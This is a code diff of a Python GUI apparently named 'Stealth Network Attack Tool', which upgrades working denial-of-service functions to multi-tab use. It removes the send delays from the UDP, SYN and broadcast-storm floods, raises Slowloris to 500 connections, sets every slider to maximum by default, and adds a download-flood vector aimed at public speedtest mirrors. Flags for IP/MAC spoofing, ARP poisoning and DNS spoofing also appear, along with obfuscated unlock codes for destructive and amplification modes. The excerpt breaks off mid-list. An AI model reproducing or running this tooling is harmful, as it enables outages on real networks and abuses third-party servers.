@@ -21,7 +21,7 @@ import platform
 class StealthJammerLinux(tk.Tk):
     def __init__(self):
         super().__init__()
-        self.title("Stealth Network Attack Tool - Linux Edition (Enhanced)")
+        self.title("Stealth Network Attack Tool - Linux Edition (Multi-Instance)")
         
         # Set window to 90% of screen size
         screen_width = self.winfo_screenwidth()
@@ -33,8 +33,12 @@ class StealthJammerLinux(tk.Tk):
         self.geometry(f"{window_width}x{window_height}+{x}+{y}")
         self.resizable(True, True)
         
+        # Tab management
+        self.instance_counter = 0
+        self.instances = []
+        
         # Configure colors and theme
-        self.bg_color = "#0a0a0a"
+        self.bg_color = "#2b2b2b"
         self.fg_color = "#00ff00"
         self.accent_color = "#00ff00"
         self.danger_color = "#ff0000"
@@ -74,6 +78,15 @@ class StealthJammerLinux(tk.Tk):
         self.ping_target = "8.8.8.8"
         self.current_ping = 0
         self.ping_monitoring = False
+        
+        # Download speed monitoring
+        self.current_download_speed = 0
+        self.download_monitoring = False
+        
+        # Bandwidth saturation (download flood)
+        self.download_flood_active = False
+        self.download_flood_threads = []
+        self.bytes_downloaded = 0
         
         # Anonymity features
         self.mac_randomization = False
@@ -115,12 +128,10 @@ class StealthJammerLinux(tk.Tk):
         # Check for scapy
         self.scapy_available = self.check_scapy()
         
-        self.build_ui()
-        self.detect_network_interface()
+        self.build_tabbed_ui()
         
-        # Start monitoring
-        self.update_stats()
-        self.start_ping_monitor()
+        # Create first instance
+        self.add_new_instance()
         
         self.protocol("WM_DELETE_WINDOW", self.on_destroy)
     
@@ -135,6 +146,170 @@ class StealthJammerLinux(tk.Tk):
             return True
         except ImportError:
             return False
+    
+    def build_tabbed_ui(self):
+        """Build the tabbed notebook interface"""
+        # Configure colors
+        self.bg_color = "#2b2b2b"
+        self.fg_color = "#00ff00"
+        self.accent_color = "#00ff00"
+        self.configure(bg=self.bg_color)
+        
+        # Main container
+        main_container = tk.Frame(self, bg=self.bg_color)
+        main_container.pack(fill='both', expand=True)
+        
+        # Top button bar
+        button_bar = tk.Frame(main_container, bg=self.bg_color, height=40)
+        button_bar.pack(fill='x', padx=10, pady=5)
+        
+        tk.Button(button_bar, text="[+] NEW INSTANCE", command=self.add_new_instance,
+                 bg='#003300', fg=self.accent_color, font=('Courier', 11, 'bold'),
+                 relief='ridge', bd=2, cursor='hand2', activebackground='#005500').pack(side='left', padx=5)
+        
+        tk.Button(button_bar, text="[X] CLOSE CURRENT", command=self.close_current_instance,
+                 bg='#330000', fg='#ff0000', font=('Courier', 11, 'bold'),
+                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='left', padx=5)
+        
+        # Create notebook for tabs
+        style = ttk.Style()
+        style.theme_use('clam')
+        style.configure('TNotebook', background=self.bg_color, borderwidth=0)
+        style.configure('TNotebook.Tab', background='#1a1a1a', foreground=self.fg_color,
+                       padding=[20, 10], font=('Courier', 10, 'bold'))
+        style.map('TNotebook.Tab', background=[('selected', '#003300')],
+                 foreground=[('selected', self.accent_color)])
+        
+        self.notebook = ttk.Notebook(main_container)
+        self.notebook.pack(fill='both', expand=True, padx=10, pady=5)
+    
+    def add_new_instance(self):
+        """Add a new attack instance tab"""
+        self.instance_counter += 1
+        instance = AttackInstance(self.notebook, self.instance_counter, self.is_root, self.scapy_available, self.bg_color, self.fg_color, self.accent_color)
+        self.instances.append(instance)
+        self.notebook.add(instance.frame, text=f"Instance {self.instance_counter}")
+        self.notebook.select(len(self.instances) - 1)
+    
+    def close_current_instance(self):
+        """Close the currently selected instance"""
+        current_tab = self.notebook.index(self.notebook.select())
+        if len(self.instances) > 1:
+            instance = self.instances[current_tab]
+            instance.cleanup()
+            self.instances.pop(current_tab)
+            self.notebook.forget(current_tab)
+        else:
+            messagebox.showwarning("Warning", "Cannot close the last instance. Use window close button to exit.")
+    
+    def on_destroy(self):
+        """Cleanup on exit"""
+        # Cleanup all instances
+        for instance in self.instances:
+            instance.cleanup()
+        self.destroy()
+
+
+# Attack Instance Class - represents each tab
+class AttackInstance:
+    def __init__(self, parent, instance_id, is_root, scapy_available, bg_color, fg_color, accent_color):
+        self.instance_id = instance_id
+        self.is_root = is_root
+        self.scapy_available = scapy_available
+        self.bg_color = bg_color
+        self.fg_color = fg_color
+        self.accent_color = accent_color
+        self.danger_color = "#ff0000"
+        self.success_color = "#00ff00"
+        self.warning_color = "#ffff00"
+        
+        # Create frame for this instance
+        self.frame = tk.Frame(parent, bg=bg_color)
+        
+        # Attack state variables (moved from main class)
+        # Configure colors and theme (already set above)
+        
+        # Attack state
+        self.attack_active = False
+        self.intensity = 5
+        self.attack_threads = []
+        self.packets_sent = 0
+        self.start_time = None
+        self.bytes_sent = 0
+        
+        # Advanced customization settings
+        self.packet_size_min = 512
+        self.packet_size_max = 2048
+        self.send_rate = 1000
+        self.burst_size = 10
+        self.thread_multiplier = 5
+        
+        # Packet preloading
+        self.preloaded_packets = []
+        self.preload_count = 1000
+        self.preload_enabled = True
+        
+        # Performance monitoring
+        self.last_packet_count = 0
+        self.last_byte_count = 0
+        self.last_update_time = time.time()
+        self.current_pps = 0
+        self.current_bandwidth = 0
+        
+        # Ping monitoring
+        self.ping_target = "8.8.8.8"
+        self.current_ping = 0
+        self.ping_monitoring = False
+        
+        # Download speed monitoring
+        self.current_download_speed = 0
+        self.download_monitoring = False
+        
+        # Bandwidth saturation (download flood)
+        self.download_flood_active = False
+        self.download_flood_threads = []
+        self.bytes_downloaded = 0
+        
+        # Anonymity features
+        self.mac_randomization = False
+        self.traffic_obfuscation = True
+        
+        # Network info
+        self.current_interface = None
+        self.current_mac = None
+        self.original_mac = None
+        self.spoofed_ip = None
+        self.spoofed_mac = None
+        
+        # Linux-specific features
+        self.raw_socket_enabled = False
+        self.use_scapy = False
+        self.arp_poison_enabled = False
+        self.dns_spoof_enabled = False
+        self.syn_flood_raw = False
+        
+        # Secret unlock for destructive attacks
+        self.destructive_unlocked = False
+        self.secret_sequence = []
+        _enc = [2, 6, 7, 12, 4, 1, 13, 3]
+        self.secret_code = [x ^ 5 for x in _enc]
+        self.failed_attempts = 0
+        
+        # Secret unlock for amplification attacks
+        self.amplification_unlocked = False
+        self.amp_sequence = []
+        _amp_enc = [6, 7, 4, 0, 2, 6]
+        self.amp_code = [x ^ 7 for x in _amp_enc]
+        self.amp_failed_attempts = 0
+        
+        # Build UI and start monitoring
+        self.build_ui()
+        self.detect_network_interface()
+        self.update_stats()
+        self.start_ping_monitor()
+        self.start_download_monitor()
+        # Auto-preload packets for maximum efficiency
+        threading.Thread(target=self.preload_packets_now, daemon=True).start()
     
     def build_ui(self):
         # Configure hacker-style theme
@@ -152,14 +327,16 @@ class StealthJammerLinux(tk.Tk):
         style.configure('Stat.TLabel', font=('Courier', 12, 'bold'), foreground=self.success_color)
         
         # Main container with canvas for scrolling
-        self.grid_rowconfigure(0, weight=1)
-        self.grid_columnconfigure(0, weight=1)
+        self.frame.grid_rowconfigure(0, weight=1)
+        self.frame.grid_columnconfigure(0, weight=1)
         
-        canvas_container = tk.Frame(self, bg=self.bg_color)
+        canvas_container = tk.Frame(self.frame, bg=self.bg_color)
         canvas_container.grid(row=0, column=0, sticky='nsew')
         canvas_container.grid_rowconfigure(0, weight=1)
         canvas_container.grid_columnconfigure(0, weight=1)
-        canvas_container.grid_columnconfigure(1, weight=1)
+        canvas_container.grid_columnconfigure(1, weight=0)
+        canvas_container.grid_columnconfigure(2, weight=1)
+        canvas_container.grid_columnconfigure(3, weight=0)
         
         # Left canvas with scrollbar
         left_canvas = tk.Canvas(canvas_container, bg=self.bg_color, highlightthickness=0)
@@ -180,31 +357,54 @@ class StealthJammerLinux(tk.Tk):
         right_canvas.configure(yscrollcommand=right_scrollbar.set)
         
         # Grid layout
-        left_canvas.grid(row=0, column=0, sticky='nsew', padx=(10, 5), pady=10)
-        left_scrollbar.grid(row=0, column=0, sticky='nse', padx=(0, 5))
-        right_canvas.grid(row=0, column=1, sticky='nsew', padx=(5, 10), pady=10)
-        right_scrollbar.grid(row=0, column=1, sticky='nse', padx=(0, 10))
+        left_canvas.grid(row=0, column=0, sticky='nsew', padx=(10, 0), pady=10)
+        left_scrollbar.grid(row=0, column=1, sticky='ns', padx=(0, 5))
+        right_canvas.grid(row=0, column=2, sticky='nsew', padx=(5, 0), pady=10)
+        right_scrollbar.grid(row=0, column=3, sticky='ns', padx=(0, 10))
         
-        # Mouse wheel scrolling - bind to each canvas separately
-        def scroll_left(event):
+        # Mouse wheel scrolling - properly bind to each canvas
+        def on_left_mousewheel(event):
             left_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
-            return "break"
         
-        def scroll_right(event):
+        def on_right_mousewheel(event):
             right_canvas.yview_scroll(int(-1*(event.delta/120)), "units")
-            return "break"
         
-        # Bind mouse wheel to canvases when mouse enters
-        left_canvas.bind("<Enter>", lambda e: left_canvas.bind_all("<MouseWheel>", scroll_left))
-        left_canvas.bind("<Leave>", lambda e: left_canvas.unbind_all("<MouseWheel>"))
-        right_canvas.bind("<Enter>", lambda e: right_canvas.bind_all("<MouseWheel>", scroll_right))
-        right_canvas.bind("<Leave>", lambda e: right_canvas.unbind_all("<MouseWheel>"))
+        # Linux mouse wheel support (Button-4/5 for up/down)
+        def on_left_scroll_up(event):
+            left_canvas.yview_scroll(-1, "units")
         
-        # Linux mouse wheel support (Button-4/5)
-        left_canvas.bind_all("<Button-4>", lambda e: left_canvas.yview_scroll(-1, "units"))
-        left_canvas.bind_all("<Button-5>", lambda e: left_canvas.yview_scroll(1, "units"))
-        right_canvas.bind_all("<Button-4>", lambda e: right_canvas.yview_scroll(-1, "units"))
-        right_canvas.bind_all("<Button-5>", lambda e: right_canvas.yview_scroll(1, "units"))
+        def on_left_scroll_down(event):
+            left_canvas.yview_scroll(1, "units")
+        
+        def on_right_scroll_up(event):
+            right_canvas.yview_scroll(-1, "units")
+        
+        def on_right_scroll_down(event):
+            right_canvas.yview_scroll(1, "units")
+        
+        # Bind to left canvas and its children
+        left_canvas.bind("<MouseWheel>", on_left_mousewheel)
+        left_canvas.bind("<Button-4>", on_left_scroll_up)
+        left_canvas.bind("<Button-5>", on_left_scroll_down)
+        left_scrollable.bind("<MouseWheel>", on_left_mousewheel)
+        left_scrollable.bind("<Button-4>", on_left_scroll_up)
+        left_scrollable.bind("<Button-5>", on_left_scroll_down)
+        
+        # Bind to right canvas and its children
+        right_canvas.bind("<MouseWheel>", on_right_mousewheel)
+        right_canvas.bind("<Button-4>", on_right_scroll_up)
+        right_canvas.bind("<Button-5>", on_right_scroll_down)
+        right_scrollable.bind("<MouseWheel>", on_right_mousewheel)
+        right_scrollable.bind("<Button-4>", on_right_scroll_up)
+        right_scrollable.bind("<Button-5>", on_right_scroll_down)
+        
+        # Helper function to recursively bind scroll events to all child widgets
+        def bind_tree(widget, canvas_scroll_func, scroll_up_func, scroll_down_func):
+            widget.bind("<MouseWheel>", canvas_scroll_func)
+            widget.bind("<Button-4>", scroll_up_func)
+            widget.bind("<Button-5>", scroll_down_func)
+            for child in widget.winfo_children():
+                bind_tree(child, canvas_scroll_func, scroll_up_func, scroll_down_func)
         
         main_frame = ttk.Frame(left_scrollable, padding=5)
         main_frame.pack(fill='both', expand=True)
@@ -398,11 +598,14 @@ class StealthJammerLinux(tk.Tk):
         intensity_header = ttk.Frame(intensity_frame)
         intensity_header.pack(fill='x')
         ttk.Label(intensity_header, text="Custom Intensity:", font=('Courier', 10, 'bold')).pack(side='left')
-        self.intensity_label = ttk.Label(intensity_header, text="Level 5 (50%)", font=('Courier', 10, 'bold'),
+        tk.Button(intensity_header, text="[MAX]", command=lambda: self.intensity_var.set(10) or self.on_intensity_changed(10),
+                 bg='#330000', fg='#ff0000', font=('Courier', 8, 'bold'), 
+                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='right', padx=5)
+        self.intensity_label = ttk.Label(intensity_header, text="Level 10 (100%)", font=('Courier', 10, 'bold'),
                                         foreground=self.accent_color)
         self.intensity_label.pack(side='right')
         
-        self.intensity_var = tk.IntVar(value=5)
+        self.intensity_var = tk.IntVar(value=10)
         self.intensity_scale = ttk.Scale(intensity_frame, from_=1, to=10,
                                         variable=self.intensity_var,
                                         orient='horizontal',
@@ -458,6 +661,16 @@ class StealthJammerLinux(tk.Tk):
         tk.Button(slow_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
                  relief='ridge', bd=1, cursor='hand2', width=3,
                  command=lambda: self.show_info("Slowloris", "Opens hundreds of connections and keeps them alive with partial HTTP headers. Exhausts web servers.")).pack(side='left', padx=5)
+        
+        # Bandwidth Saturation (Download Flood)
+        download_flood_frame = ttk.Frame(vectors_frame)
+        download_flood_frame.pack(fill='x', pady=2)
+        self.vector_download_flood_var = tk.BooleanVar(value=False)
+        ttk.Checkbutton(download_flood_frame, text="[*] Bandwidth Saturation (Download Flood)", 
+                       variable=self.vector_download_flood_var).pack(side='left')
+        tk.Button(download_flood_frame, text="[?]", font=('Courier', 7), bg='#001100', fg=self.accent_color,
+                 relief='ridge', bd=1, cursor='hand2', width=3,
+                 command=lambda: self.show_info("Bandwidth Saturation", "Downloads massive amounts of data continuously without storing. Saturates your own bandwidth and can impact network performance.")).pack(side='left', padx=5)
         
         # Separator
         ttk.Separator(attack_frame, orient='horizontal').pack(fill='x', pady=10)
@@ -663,11 +876,14 @@ class StealthJammerLinux(tk.Tk):
         rate_header = ttk.Frame(rate_frame)
         rate_header.pack(fill='x')
         ttk.Label(rate_header, text="Packets/sec per thread:", font=('Courier', 9)).pack(side='left')
-        self.rate_value_label = ttk.Label(rate_header, text="1000", font=('Courier', 9, 'bold'),
+        tk.Button(rate_header, text="[MAX]", command=lambda: self.send_rate_var.set(10000) or self.update_send_rate(10000),
+                 bg='#330000', fg='#ff0000', font=('Courier', 8, 'bold'), 
+                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='right', padx=5)
+        self.rate_value_label = ttk.Label(rate_header, text="10000", font=('Courier', 9, 'bold'),
                                          foreground=self.accent_color)
         self.rate_value_label.pack(side='right')
         
-        self.send_rate_var = tk.IntVar(value=1000)
+        self.send_rate_var = tk.IntVar(value=10000)
         rate_scale = ttk.Scale(rate_frame, from_=100, to=10000, variable=self.send_rate_var,
                               orient='horizontal', command=self.update_send_rate)
         rate_scale.pack(fill='x', pady=2)
@@ -695,11 +911,14 @@ class StealthJammerLinux(tk.Tk):
         burst_header = ttk.Frame(burst_frame)
         burst_header.pack(fill='x')
         ttk.Label(burst_header, text="Packets per burst:", font=('Courier', 9)).pack(side='left')
-        self.burst_value_label = ttk.Label(burst_header, text="10", font=('Courier', 9, 'bold'),
+        tk.Button(burst_header, text="[MAX]", command=lambda: self.burst_size_var.set(100) or self.update_burst_size(100),
+                 bg='#330000', fg='#ff0000', font=('Courier', 8, 'bold'), 
+                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='right', padx=5)
+        self.burst_value_label = ttk.Label(burst_header, text="100", font=('Courier', 9, 'bold'),
                                           foreground=self.accent_color)
         self.burst_value_label.pack(side='right')
         
-        self.burst_size_var = tk.IntVar(value=10)
+        self.burst_size_var = tk.IntVar(value=100)
         burst_scale = ttk.Scale(burst_frame, from_=1, to=100, variable=self.burst_size_var,
                                orient='horizontal', command=self.update_burst_size)
         burst_scale.pack(fill='x', pady=2)
@@ -715,11 +934,14 @@ class StealthJammerLinux(tk.Tk):
         thread_header = ttk.Frame(thread_frame)
         thread_header.pack(fill='x')
         ttk.Label(thread_header, text="Threads per intensity:", font=('Courier', 9)).pack(side='left')
-        self.thread_value_label = ttk.Label(thread_header, text="5x", font=('Courier', 9, 'bold'),
+        tk.Button(thread_header, text="[MAX]", command=lambda: self.thread_multiplier_var.set(20) or self.update_thread_multiplier(20),
+                 bg='#330000', fg='#ff0000', font=('Courier', 8, 'bold'), 
+                 relief='ridge', bd=2, cursor='hand2', activebackground='#550000').pack(side='right', padx=5)
+        self.thread_value_label = ttk.Label(thread_header, text="20x", font=('Courier', 9, 'bold'),
                                            foreground=self.accent_color)
         self.thread_value_label.pack(side='right')
         
-        self.thread_multiplier_var = tk.IntVar(value=5)
+        self.thread_multiplier_var = tk.IntVar(value=20)
         thread_scale = ttk.Scale(thread_frame, from_=1, to=20, variable=self.thread_multiplier_var,
                                 orient='horizontal', command=self.update_thread_multiplier)
         thread_scale.pack(fill='x', pady=2)
@@ -739,7 +961,7 @@ class StealthJammerLinux(tk.Tk):
         preload_count_frame = ttk.Frame(advanced_frame)
         preload_count_frame.pack(fill='x', pady=2)
         ttk.Label(preload_count_frame, text="Preload Count:", font=('Courier', 9)).pack(side='left')
-        self.preload_count_var = tk.IntVar(value=1000)
+        self.preload_count_var = tk.IntVar(value=10000)
         preload_spin = tk.Spinbox(preload_count_frame, from_=100, to=10000, increment=100,
                                  textvariable=self.preload_count_var, font=('Courier', 9),
                                  width=8, command=self.update_preload_count,
@@ -830,6 +1052,13 @@ class StealthJammerLinux(tk.Tk):
         self.data_label = ttk.Label(data_frame, text="0 KB", style='Stat.TLabel')
         self.data_label.pack(side='right')
         
+        # Data downloaded
+        download_data_frame = ttk.Frame(stats_grid)
+        download_data_frame.pack(fill='x', pady=3)
+        ttk.Label(download_data_frame, text="Data Downloaded:", font=('Courier', 10)).pack(side='left')
+        self.download_data_label = ttk.Label(download_data_frame, text="0 KB", style='Stat.TLabel')
+        self.download_data_label.pack(side='right')
+        
         # Duration
         time_frame = ttk.Frame(stats_grid)
         time_frame.pack(fill='x', pady=3)
@@ -848,6 +1077,13 @@ class StealthJammerLinux(tk.Tk):
         self.ping_label = ttk.Label(ping_container, text="Measuring...", style='Stat.TLabel')
         self.ping_label.pack(side='right')
         
+        # Download Speed
+        download_container = ttk.Frame(perf_frame)
+        download_container.pack(fill='x', pady=3)
+        ttk.Label(download_container, text="Download Speed:", font=('Courier', 10)).pack(side='left')
+        self.download_label = ttk.Label(download_container, text="Measuring...", style='Stat.TLabel')
+        self.download_label.pack(side='right')
+        
         # Thread count
         threads_container = ttk.Frame(perf_frame)
         threads_container.pack(fill='x', pady=3)
@@ -865,7 +1101,7 @@ class StealthJammerLinux(tk.Tk):
         log_scroll = ttk.Scrollbar(log_frame)
         log_scroll.grid(row=0, column=1, sticky='ns')
         
-        self.log_text = tk.Text(log_frame, height=15, bg='#000000', fg=self.accent_color,
+        self.log_text = tk.Text(log_frame, height=15, bg='#1e1e1e', fg=self.accent_color,
                                font=('Courier', 9), wrap='word', yscrollcommand=log_scroll.set)
         self.log_text.grid(row=0, column=0, sticky='nsew')
         log_scroll.config(command=self.log_text.yview)
@@ -878,6 +1114,10 @@ class StealthJammerLinux(tk.Tk):
             self.log_message("Running without root - Some features disabled", "WARNING")
         if self.scapy_available:
             self.log_message("Scapy library detected - Advanced packet crafting available", "INFO")
+        
+        # Apply scroll bindings to all child widgets
+        bind_tree(main_frame, on_left_mousewheel, on_left_scroll_up, on_left_scroll_down)
+        bind_tree(right_main_frame, on_right_mousewheel, on_right_scroll_up, on_right_scroll_down)
     
     def log_message(self, message, level="INFO"):
         """Add message to activity log"""
@@ -913,6 +1153,49 @@ class StealthJammerLinux(tk.Tk):
         """Start ping monitoring in background"""
         self.ping_monitoring = True
         threading.Thread(target=self.ping_monitor_thread, daemon=True).start()
+    
+    def start_download_monitor(self):
+        """Start download speed monitoring in background"""
+        self.download_monitoring = True
+        threading.Thread(target=self.download_monitor_thread, daemon=True).start()
+    
+    def download_monitor_thread(self):
+        """Monitor download speed in background"""
+        import urllib.request
+        
+        # Use larger files for more accurate speed testing
+        test_urls = [
+            "http://speedtest.tele2.net/1MB.zip",
+            "http://ipv4.download.thinkbroadband.com/1MB.zip",
+            "http://proof.ovh.net/files/1Mb.dat"
+        ]
+        
+        while self.download_monitoring:
+            try:
+                test_url = random.choice(test_urls)
+                start_time = time.time()
+                total_bytes = 0
+                
+                # Stream download with larger chunk size
+                with urllib.request.urlopen(test_url, timeout=5) as response:
+                    chunk_size = 131072  # 128KB chunks
+                    while True:
+                        chunk = response.read(chunk_size)
+                        if not chunk:
+                            break
+                        total_bytes += len(chunk)
+                    
+                    download_time = time.time() - start_time
+                    
+                    if download_time > 0:
+                        # Calculate speed in bytes per second
+                        self.current_download_speed = int(total_bytes / download_time)
+                    else:
+                        self.current_download_speed = 0
+            except Exception as e:
+                self.current_download_speed = 0
+            
+            time.sleep(3)  # Test every 3 seconds for faster updates
     
     def ping_monitor_thread(self):
         """Monitor ping in background"""
@@ -1015,14 +1298,14 @@ class StealthJammerLinux(tk.Tk):
             
             # Update status every 100 packets
             if (i + 1) % 100 == 0:
-                self.after(0, lambda count=i+1: self.preload_status.config(
+                self.frame.after(0, lambda count=i+1: self.preload_status.config(
                     text=f"Packets ready: {count}/{self.preload_count}"))
         
         total_bytes = sum(p['size'] for p in self.preloaded_packets)
-        self.after(0, lambda: self.preload_status.config(
+        self.frame.after(0, lambda: self.preload_status.config(
             text=f"Packets ready: {len(self.preloaded_packets)} ({self.format_bytes(total_bytes)})",
             foreground=self.success_color))
-        self.after(0, lambda: self.log_message(
+        self.frame.after(0, lambda: self.log_message(
             f"Preloaded {len(self.preloaded_packets)} packets ({self.format_bytes(total_bytes)})", "INFO"))
     
     def detect_network_interface(self):
@@ -1068,7 +1351,7 @@ class StealthJammerLinux(tk.Tk):
         """Generate spoofed IP and MAC for packets"""
         self.spoofed_ip = f"{random.randint(10, 200)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
         self.spoofed_mac = self.generate_random_mac()
-        self.after(0, self.update_spoof_display)
+        self.frame.after(0, self.update_spoof_display)
     
     def update_network_display(self):
         """Update network info display"""
@@ -1112,15 +1395,15 @@ class StealthJammerLinux(tk.Tk):
             subprocess.run(['ip', 'link', 'set', self.current_interface, 'up'], check=True, timeout=10)
             
             self.current_mac = new_mac
-            self.after(0, self.update_network_display)
-            self.after(0, lambda: self.log_message(f"MAC address changed to {new_mac}", "INFO"))
-            self.after(0, lambda: messagebox.showinfo(
+            self.frame.after(0, self.update_network_display)
+            self.frame.after(0, lambda: self.log_message(f"MAC address changed to {new_mac}", "INFO"))
+            self.frame.after(0, lambda: messagebox.showinfo(
                 "MAC Address Changed",
                 f"Successfully changed to {new_mac}\n\nReconnecting to network..."
             ))
         except Exception as e:
-            self.after(0, lambda: self.log_message(f"MAC change failed: {str(e)}", "ERROR"))
-            self.after(0, lambda: messagebox.showerror(
+            self.frame.after(0, lambda: self.log_message(f"MAC change failed: {str(e)}", "ERROR"))
+            self.frame.after(0, lambda: messagebox.showerror(
                 "MAC Change Failed",
                 f"Error: {str(e)}\n\nMake sure you have root privileges."
             ))
@@ -1253,7 +1536,7 @@ class StealthJammerLinux(tk.Tk):
             else:
                 self.activity_log.insert('1.0', f"[WARN] Wrong amplification password! {remaining} attempt(s) remaining.\n", 'warning')
                 self.amp_entry.config(bg='#330000')
-                self.after(200, lambda: self.amp_entry.config(bg='#221100'))
+                self.frame.after(200, lambda: self.amp_entry.config(bg='#221100'))
             
             self.amp_entry_var.set("")
     
@@ -1293,7 +1576,7 @@ class StealthJammerLinux(tk.Tk):
             else:
                 self.activity_log.insert('1.0', f"[WARN] Wrong destructive password! {remaining} attempt(s) remaining.\n", 'warning')
                 self.dest_entry.config(bg='#330000')
-                self.after(200, lambda: self.dest_entry.config(bg='#220000'))
+                self.frame.after(200, lambda: self.dest_entry.config(bg='#220000'))
             
             self.dest_entry_var.set("")
     
@@ -1419,6 +1702,19 @@ class StealthJammerLinux(tk.Tk):
                 t.start()
                 self.attack_threads.append(t)
         
+        # Bandwidth Saturation (Download Flood)
+        if self.vector_download_flood_var.get():
+            active_vectors.append("Bandwidth Saturation")
+            self.download_flood_active = True
+            self.bytes_downloaded = 0
+            # Use more threads for maximum bandwidth saturation
+            download_threads = num_threads * 3
+            for _ in range(download_threads):
+                t = threading.Thread(target=self.download_flood_attack, daemon=True)
+                t.start()
+                self.download_flood_threads.append(t)
+            self.log_message(f"[ATTACK] Bandwidth saturation started with {download_threads} download threads", "ATTACK")
+        
         # Amplification attacks (require password unlock)
         if self.vector_dns_var.get() and self.amplification_unlocked:
             active_vectors.append("DNS Amplification")
@@ -1503,6 +1799,7 @@ class StealthJammerLinux(tk.Tk):
     def stop_attack(self):
         """Stop the attack"""
         self.attack_active = False
+        self.download_flood_active = False
         
         self.attack_button.config(text="[>] INITIATE ATTACK", bg='#003300')
         self.status_label.config(text="Idle", foreground=self.warning_color)
@@ -1511,21 +1808,24 @@ class StealthJammerLinux(tk.Tk):
         self.log_message("ATTACK TERMINATED", "WARNING")
         self.log_message(f"Total packets sent: {self.packets_sent:,}", "INFO")
         self.log_message(f"Total data sent: {self.format_bytes(self.bytes_sent)}", "INFO")
+        if self.bytes_downloaded > 0:
+            self.log_message(f"Total data downloaded: {self.format_bytes(self.bytes_downloaded)}", "INFO")
         self.log_message("=" * 50, "WARNING")
         
         self.attack_threads = []
+        self.download_flood_threads = []
     
     def udp_flood_attack(self):
-        """UDP flood with preloaded packets"""
+        """UDP flood with preloaded packets - MAXIMUM EFFICIENCY"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB send buffer
             
-            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
             preload_index = 0
             
             while self.attack_active:
                 try:
+                    # Send bursts with no delay for maximum efficiency
                     for _ in range(self.burst_size):
                         if self.preload_enabled and len(self.preloaded_packets) > 0:
                             packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
@@ -1542,9 +1842,7 @@ class StealthJammerLinux(tk.Tk):
                         
                         self.packets_sent += 1
                         self.bytes_sent += size
-                    
-                    if delay_per_burst > 0:
-                        time.sleep(delay_per_burst)
+                    # NO DELAY - maximum overload
                 except:
                     pass
             
@@ -1553,15 +1851,14 @@ class StealthJammerLinux(tk.Tk):
             pass
     
     def tcp_syn_attack(self):
-        """TCP SYN flood"""
+        """TCP SYN flood - MAXIMUM EFFICIENCY"""
         try:
-            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
-            
             while self.attack_active:
                 try:
+                    # Send bursts with no delay for maximum efficiency
                     for _ in range(self.burst_size):
                         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(0.01)
+                        sock.settimeout(0.001)  # Minimal timeout
                         
                         port = random.randint(1, 65535)
                         target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
@@ -1574,9 +1871,7 @@ class StealthJammerLinux(tk.Tk):
                         sock.close()
                         self.packets_sent += 1
                         self.bytes_sent += 60
-                    
-                    if delay_per_burst > 0:
-                        time.sleep(delay_per_burst)
+                    # NO DELAY - maximum overload
                 except:
                     pass
         except:
@@ -1661,17 +1956,17 @@ class StealthJammerLinux(tk.Tk):
         return ip_header + tcp_header
     
     def broadcast_storm_attack(self):
-        """Broadcast storm"""
+        """Broadcast storm - MAXIMUM EFFICIENCY"""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB send buffer
             
-            delay_per_burst = self.burst_size / self.send_rate if self.send_rate > 0 else 0.001
             preload_index = 0
             
             while self.attack_active:
                 try:
+                    # Send bursts with no delay for maximum efficiency
                     for _ in range(self.burst_size):
                         if self.preload_enabled and len(self.preloaded_packets) > 0:
                             packet = self.preloaded_packets[preload_index % len(self.preloaded_packets)]
@@ -1686,9 +1981,7 @@ class StealthJammerLinux(tk.Tk):
                         
                         self.packets_sent += 1
                         self.bytes_sent += size
-                    
-                    if delay_per_burst > 0:
-                        time.sleep(delay_per_burst)
+                    # NO DELAY - maximum overload
                 except:
                     pass
             
@@ -1697,14 +1990,14 @@ class StealthJammerLinux(tk.Tk):
             pass
     
     def slowloris_attack(self):
-        """Slowloris attack - keeps connections open with partial HTTP headers"""
+        """Slowloris attack - keeps connections open with partial HTTP headers - MAXIMUM EFFICIENCY"""
         connections = []
         try:
-            # Open multiple connections
-            for _ in range(100):
+            # Open many more connections for maximum impact
+            for _ in range(500):  # 5x more connections
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(4)
+                    sock.settimeout(2)  # Faster timeout
                     target = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
                     sock.connect((target, 80))
                     sock.send(b"GET / HTTP/1.1\r\n")
@@ -1715,7 +2008,7 @@ class StealthJammerLinux(tk.Tk):
                 except:
                     pass
             
-            # Keep connections alive
+            # Keep connections alive with faster updates
             while self.attack_active and connections:
                 for sock in connections[:]:
                     try:
@@ -1724,7 +2017,7 @@ class StealthJammerLinux(tk.Tk):
                         self.bytes_sent += 10
                     except:
                         connections.remove(sock)
-                time.sleep(10)
+                time.sleep(5)  # Faster keep-alive (was 10s)
         except:
             pass
         finally:
@@ -1733,6 +2026,42 @@ class StealthJammerLinux(tk.Tk):
                     sock.close()
                 except:
                     pass
+    
+    def download_flood_attack(self):
+        """Bandwidth saturation - downloads massive amounts of data without storing"""
+        import urllib.request
+        
+        # Large file URLs for bandwidth saturation (use legitimate CDN mirrors)
+        download_urls = [
+            "http://speedtest.tele2.net/100MB.zip",
+            "http://speedtest.tele2.net/10MB.zip",
+            "http://ipv4.download.thinkbroadband.com/100MB.zip",
+            "http://ipv4.download.thinkbroadband.com/50MB.zip",
